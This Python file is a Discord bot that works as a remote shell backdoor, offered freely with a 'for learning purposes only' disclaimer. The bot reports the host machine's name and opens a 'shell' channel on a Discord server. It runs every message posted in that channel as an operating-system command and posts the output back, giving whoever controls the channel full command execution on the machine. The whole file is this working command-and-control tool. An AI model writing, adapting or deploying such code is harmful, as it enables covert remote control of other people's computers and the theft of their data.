# Made by Kami
# Free to use and post anywhere

# I AM NOT RESPONSIBLE OF ANY OF YOUR ACTIONS, THIS IS FOR LEARNING PURPOSES ONLY

import discord
import subprocess
import os

intents = discord.Intents.all()
intents.messages = True

TOKEN = 'token'
GUILD_ID = 'guildid'
CHANNEL_NAME = 'shell' 

client = discord.Client(intents=intents)

MAX_FIELD_LENGTH = 900

def split(output, maxlen):
    lines = output.splitlines()
    chunks = []
    cchunk = ""
    
    for line in lines:
        if len(cchunk) + len(line) + 1 > maxlen: 
            chunks.append(cchunk)
            cchunk = line 
        else:
            cchunk += f"\n{line}" if cchunk else line 
    
    if cchunk: 
        chunks.append(cchunk)
    
    return chunks

@client.event
async def on_ready():
    machine_name = os.environ['COMPUTERNAME']
    await client.change_presence(activity=discord.Game(name=machine_name))

    guild = discord.utils.get(client.guilds, id=int(GUILD_ID))
    exchannel = discord.utils.get(guild.channels, name=CHANNEL_NAME)

    if exchannel is None:
        await guild.create_text_channel(CHANNEL_NAME)


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.channel.name == CHANNEL_NAME:
        command = message.content.strip()

        if command:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)

                chunks = split(output, MAX_FIELD_LENGTH)
                chunkc = len(chunks)

                for i, chunk in enumerate(chunks):
                    embed = discord.Embed(title=f"Command output (part {i + 1}/{chunkc})", color=discord.Color.blue())
                    embed.add_field(name="Command", value=f"`{command}`", inline=False)
                    embed.add_field(name="Output", value=f'```ansi\n\x1b[32m{chunk}\x1b[0m\n```', inline=False)

                    await message.channel.send(embed=embed)

            except subprocess.CalledProcessError as e:
                error = e.output if e.output else str(e)
                
                chunks = split(error, MAX_FIELD_LENGTH)
                chunkc = len(chunks)

                for i, chunk in enumerate(chunks):
                    embed = discord.Embed(title=f"Error (part {i + 1}/{chunkc})", color=discord.Color.red())
                    embed.add_field(name="Command", value=f"`{command}`", inline=False)
                    embed.add_field(name="Error details", value=f'```ansi\n\x1b[31m{chunk}\x1b[0m\n```', inline=False)

                    await message.channel.send(embed=embed)
        else:
            await message.channel.send('Please send a valid command.')

client.run(TOKEN)
